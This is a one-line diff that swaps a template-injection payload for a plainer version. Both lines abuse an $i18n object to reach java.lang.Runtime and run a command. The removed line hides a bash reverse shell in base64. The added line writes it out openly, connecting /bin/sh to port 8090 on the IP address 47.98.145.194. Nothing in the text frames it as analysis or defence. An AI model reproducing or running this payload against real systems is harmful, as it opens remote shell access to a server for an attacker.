@@ -1,1 +1,1 @@
-$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xNDUuMTk0LzgwOTAgMD4mMQ==}|{base64,-d}|{bash,-i}').waitFor()
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('/bin/sh -i >& /dev/tcp/47.98.145.194/8090 0>&1').waitFor()
